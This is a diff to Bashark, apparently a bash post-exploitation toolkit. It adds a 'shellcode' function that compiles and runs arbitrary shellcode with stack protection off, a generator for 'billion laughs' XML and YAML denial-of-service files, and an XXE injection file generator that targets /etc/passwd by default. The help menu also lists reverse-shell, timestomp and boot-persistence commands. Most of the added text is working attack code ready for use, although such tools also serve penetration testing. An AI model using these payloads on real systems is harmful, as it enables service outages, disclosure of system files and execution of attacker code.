@@ -493,7 +493,7 @@ fnd(){
         ${underline}USAGE:${reset}       
             fnd [-h] [-v] PATTERN
         ${underline}DESCRIPTION:${reset} 
-            Search for string occurrence in current directory"
+            Search for regex occurrence in current directory"
     else
         if [[ "$@" =~ .*-v.* ]]; then
             grep -rGnw '.' -e "${@: -1}"
@@ -887,6 +887,120 @@ jshell(){
     fi
 }
 
+shellcode(){
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}       
+            shellcode [-h] SHELLCODE
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            SHELLCODE    Shellcode to execute in '\x' escaped form
+        ${underline}DESCRIPTION:${reset}
+            Execute specified shellcode"
+    else
+        if [ $# -eq 0 ]; then
+            print_error "Specify the shellcode to run"
+        else
+            shellcode=$1
+            cat >executor.c <<EOL
+const char code[] = "${shellcode}";
+
+int main(int argc, char **argv)
+{
+    int (*exeshell)();
+    exeshell = (int (*)()) code;
+    (int)(*exeshell)();
+    return 0;
+}
+EOL
+        gcc -fno-stack-protector -z execstack -o AAA executor.c
+        ./AAA
+        rm executor.c
+        rm AAA
+    fi
+    fi
+}
+
+xml_dos(){
+    if [[ "$@" =~ .*-h.* ]]; then
+    echo "
+        ${underline}USAGE:${reset}       
+            xml_dos [-h] FORMAT
+        ${underline}POSITIONAL ARGUMENTS:${reset} 
+            FORMAT  Format of a DOS file [xml|yaml] 
+        ${underline}DESCRIPTION:${reset} 
+            Generate a 'billion laughs' DOS file"
+    else
+        if [ $# -eq 0 ]; then
+            print_error "Specify the FORMAT"
+        else
+            format=$1
+            if [ $format == "yaml" ]; then
+                cat >dos.yml <<EOL
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+EOL
+            print_good "Saved payload as ${bold}dos.yml${reset}"
+            elif [ $format == "xml" ]; then
+                cat >dos.xml <<EOL
+<?xml version="1.0"?>
+ <!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ELEMENT lolz (#PCDATA)>
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+ ]>
+<lolz>&lol9;</lolz>
+EOL
+                print_good "Saved payload as ${bold}dos.xml${reset}"
+            else
+                print_error "No such format"
+            fi
+        fi
+    fi
+}
+
+xxe(){
+    if [[ "$@" =~ .*-h.* ]]; then
+    echo "
+        ${underline}USAGE:${reset}       
+            xxe [-h] [PAYLOAD]
+        ${underline}OPTIONAL POSITIONAL ARGUMENTS:${reset} 
+            [PAYLOAD]  Payload to execute inside the entity (default: file:///etc/passwd)
+        ${underline}DESCRIPTION:${reset} 
+            Generate a XML External Entity Injection file"
+    else
+        if [ $# -eq 0 ]; then
+            payload="file:///etc/passwd"
+        else
+            payload=$1
+        fi
+        cat >file.xml <<EOL
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "${payload}" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+EOL
+        print_good "Generated ${bold}file.xml${reset} with ${bold}${payload}${reset} payload"
+    fi 
+}
+
 ###Commands that require root
 portblock(){
     if [[ "$@" =~ .*-h.* ]]; then 
@@ -1030,10 +1144,13 @@ Bashark ver. 1.0 Commands:
         ${bold}portscan${reset}${green}     -> ${reset}Perform a portscan
         ${bold}quit${reset}${green}         -> ${reset}Exit Bashark
         ${bold}revshell${reset}${green}     -> ${reset}Spawn a reverse shell
+        ${bold}shellcode${reset}${green}    -> ${reset}Execute shellcode in "\x" escaped form
         ${bold}t${reset}${green}            -> ${reset}Create a file
         ${bold}timestomp${reset}${green}    -> ${reset}Change attributes of a file
         ${bold}usrs${reset}${green}         -> ${reset}Show all users on the host
-        
+        ${bold}xml_dos${reset}${green}      -> ${reset}Create a XML or YAML DOS file 
+        ${bold}xxe${reset}${green}          -> ${reset}Generate a XML External Entity Injection file 
+
         (${red}root required${reset}):
         ${bold}portblock${reset}${red}    -> ${reset}Block all opened ports except whitelisted
         ${bold}persist${reset}${red}      -> ${reset}Set a command to be executed after every boot
